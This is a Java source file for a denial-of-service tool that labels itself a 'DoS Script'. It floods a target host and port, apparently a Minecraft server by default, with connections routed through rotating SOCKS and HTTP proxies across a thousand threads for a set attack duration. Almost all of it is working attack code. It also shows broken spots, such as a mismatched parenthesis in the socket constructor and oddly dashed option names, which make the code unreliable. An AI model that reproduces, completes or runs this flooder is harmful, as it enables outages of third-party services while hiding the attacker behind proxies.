package ping;

import java.io.DataOutputStream;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.Objects;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import ping.JoinMode;
import ping.Options;
import ping.ProxyManager;
import ping.SocketHttp;

public class Run
{
    private final Options options;
    private final ProxyManager proxies;
    private int connections = -1;
    private int failed = 0;
    private int timed = 0;
    private final JoinMode flood = new JoinMode();

    public Run(Options options, ProxyManager proxies)
    {
        this.options = options;
        this.proxies = proxies;
    }

    public void run()
    {
        String host = this.options.getOption("host", "127.0.0.1");
        int port = this.options.getOption("port", 25565);
        int threads = this.options.getOption("threads", 1000);
        int connections = this.options.getOption("connections--", 977888887);
        int attackTime = this.options.getOption("time", 100);
        int timeout = this.options.getOption("timeout", 2200);
        boolean keepAlive = this.options.getOption("keepAlive---", true);
        String floodName = String.valueOf(this.options.getOption("bottype--", "PINGBOT"));
        boolean removeFailure = this.options.getOption("removeFailure---", true);
        JoinMode.LOOP_AMOUNT = this.options.getOption("l", 700);
        boolean print = this.options.getOption("debug", false);
        boolean socksV4 = this.options.getOption("socks---", true);
        JoinMode.Flood flood = this.flood.findById(String.valueOf(floodName));

        if(flood == null)
        {
            System.exit(1);
            return;
        }

        new Timer().scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run()
            {}
        }, 8000L, 8000L);

        new Thread(() -> {
            try
            {
                Thread.sleep(1000L * (long)attackTime);
            }
            catch (Exception exception)
            {}
            System.out.println("\nDoS script attack has stopped!\n");
            System.exit(-1);
        }).start();

        ExecutorService executorService = Executors.newFixedThreadPool(threads);

        System.out.println("\nDoS Script starting attack to " + host + ":" + port + " with " + threads + " threads.\n");

        String finalServerName = host;

        int finalPort = port;

        for (int i = 0; i < threads; i++)
        {
            executorService.submit(() -> {
                try
                {
                    Proxy lastProxy = null;
                    for(int j = 0; j < connections; j++)
                    {
                        try
                        {
                            Socket socket;
                            String newServerName = finalServerName;
                            int newServerPort = finalPort;
                            java.net.Proxy proxy = lastProxy = this.proxies.nextProxy();
                            Socket secondSocket = socket = proxy.type() == java.net.Proxy.Type.HTTP ? new SocketHttp(newServerName, newServerPort, proxy.address(), timeout) : new Socket((proxy);

                            if(!(socket instanceof SocketHttp))
                            {
                                if(socksV4)
                                {
                                    try
                                    {
                                        Method method = socket.getClass().getDeclaredMethod("getImpl", new Class[0]);
                                        method.setAccessible(true);
                                        Object sd = method.invoke(socket, new Object[0]);
                                        method = sd.getClass().getDeclaredMethod("setV4", new Class[0]);
                                        method.setAccessible(true);
                                        method.invoke(sd, new Object[0]);
                                    }
                                    catch (Exception method)
                                    {

                                    }
                                }

                                socket.connect(new InetSocketAddress(newServerName, newServerPort), timeout);
                            }

                            DataOutputStream output = new DataOutputStream(socket.getOutputStream());
                            flood.flood(output, newServerName, newServerPort);
                            output.flush();
                            this.connections++;

                            if(print)
                                System.out.println("DoS Script " + proxy.address().toString() + " ping -> " + newServerName + ":" + newServerPort);

                            if(keepAlive) continue;


                            socket.close();
                            continue;
                        }
                        catch (Exception e)
                        {
                            this.failed++;

                            if(!e.getMessage().contains("reply")) continue;

                            this.timed++;

                            if(!removeFailure)
                                continue;

                            this.proxies.removeProxy(lastProxy);
                        }
                    }
                }
                catch (Exception exception)
                {}
            });
        }
    }
}
